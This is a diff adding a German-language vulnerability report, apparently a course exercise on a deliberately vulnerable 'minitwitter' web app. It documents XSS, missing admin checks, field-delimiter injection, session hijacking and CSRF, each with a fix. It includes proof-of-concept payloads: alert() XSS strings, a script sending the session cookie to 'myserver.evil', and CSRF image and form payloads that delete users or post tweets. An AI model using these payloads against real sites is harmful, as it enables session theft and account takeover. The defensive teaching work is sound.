@@ -1,0 +1,85 @@
+Gefundene Lücken:
+
+Nummer 1:
+=========
+
+- Kurzbeschreibung der Lücke: Cross-Site-Scripting an verschiedenen Stellen möglich
+  1. In Tweets, z.B. <script>alert("XSS!")</script>
+  2. Über präparierte Links mit Messages: localhost:8080/?message=Great! Now the world knows.<script>alert("XSS")%3B</script>
+  3. In Realnamen bei Anzeige des Tweet-Autoren: u<script>alert("XSS2");</script>
+  4. In Realnamen, Benutzernamen und Passwörtern bei Anzeige in der Nutzerverwaltung
+
+- Typ der Sicherheitslücke gem. Vorlesung: XSS
+
+- Maßnahmen zu Behebung: Autoescape in Templates benutzen ({% autoescape false %} entfernen und nur in einzelnen
+  begründeten Fällen ungefiltertes HTML zulassen ( Filter {{foo|safe}} für Beispielvariable foo verwenden)
+
+- geänderte Dateien:
+  - templates.jinja2/skel.tmpl - {% autoescape false %} entfernt
+  - templates.jinja2/minitwitter.tmpl - Alle Filter |safe entfernt
+  - templates.jinja2/usermanagement.tmpl - {% autoescape off %} entfernt
+
+
+Nummer 2:
+=========
+
+- Kurzbeschreibung der Lücke: Alle angemeldeten Nutzer können neue Nutzer anlegen und vorhandene Nutzer löschen
+  - Anlegen: http://localhost:8080/useradmin/create?username=t&password=t&role=admin&fullname=tobias
+  - Löschen: http://localhost:8080/useradmin/delete/t
+  Danach erscheint zwar eine Fehlermeldung wg. mangelnder Rechte, aber die stammt von der Weiterleitung auf die
+  Anzeige der Nutzerverwaltung. Die Nutzer werden trotzdem angelegt bzw. gelöscht.
+
+- Typ der Sicherheitslücke gem. Vorlesung: Mangelnder Rechtecheck
+
+- Maßnahmen zu Behebung:
+  - Auch in den Routen create und delete auf die Rechtestufe prüfen:
+        if not request.session['user'].is_admin:
+            raise StopProcessing(400, "You are not an admin!")
+  - Besser: In create prüfen, ob die Parameter tatsächlich per POST übermittelt wurden
+    (macht Ausnutzen der Lücke etwas schwieriger)
+
+- geänderte Dateien:
+  server/apps/usermanagement.py
+
+Nummer 3:
+=========
+
+- Kurzbeschreibung der Lücke: Autorenangabe und Datum können gefälscht werden
+  Wird folgender Tweet abgesetzt: Hallo#Admin#19.12.1492
+- Typ der Sicherheitslücke gem. Vorlesung: Special Character Injection
+- Maßnahmen zu Behebung: Tweets dürfen keine # enthalten (löschen oder ersetzen)
+- geänderte Dateien: minitwitter.py#save
+  f.write(status.replace("#","") + "#"+ request.session['user'].fullname + "#" + now + "\n")
+
+
+Nummer 4:
+=========
+
+- Kurzbeschreibung der Lücke: Übernahme einer Nutzersession
+  Über eine der XSS-Lücken (s. Nummer 1) kann das Session-Cookie ausgelesen und an einen eigenen Server werden, z.B. per
+  <script>i=new Image(); i.src="http://myserver.evil?id="+document.cookie.match(new RegExp('(^| )_sessid=([^;]+)'))[2]</script>
+- Typ der Sicherheitslücke gem. Vorlesung: Session Hijacking
+- Maßnahmen zu Behebung: Session-Cookie immer mit dem Flag httpOnly ausliefern
+- geänderte Dateien:
+  server/webserver.py Klasse Cookie#make_cookie
+    return Cookie(self.cookiename, self.sessid, path='/', httpOnly=True)
+
+Nummer 5:
+=========
+
+- Kurzbeschreibung der Lücke:
+  - Admins können durch manipulierte Links dazu gebracht werden, neue Nutzer anzulegen und Nutzer zu löschen
+    z.B. durch E-Mail mit Bild oder Locken auf eine Webseite mit Bild: <img src="http://localhost:8080/delete/admin">
+  - Normale Nutzer können dazu gebracht werden, vom Angreifer vorgegebene Tweets abzusetzen. Da das nur mit POST-Requests
+    geht, ist der Aufwand etwas höher. Der Nutzer müsste auf eine vom Angreifer präparierte Webseite gelockt werden,
+    auf der sich ein Formular wir das folgende befindet:
+    <form action="http://localhost:8080/" method="POST">
+       <input type=hidden name=status value="Der Admin ist doof.<script>XSS-Angriff</script>">
+       <button type=submit value="Millionengewinn abrufen!">
+    </form>
+  - Normale Nutzer können ausgeloggt werden (Bild: <img src="http://localhost:8080/logout">) - das ist auf den ersten
+    Blick einfach nur nervig und kein echtes Problem, kann aber auch als Vorbereitung für andere Angriffe dienen
+  - Alle Aktionen können über AJAX-Requests ausgeführt werden, wenn es XSS-Lücken gibt:
+
+- Typ der Sicherheitslücke gem. Vorlesung: CSRF
+- Maßnahmen zu Behebung: s. Aufgabe 4
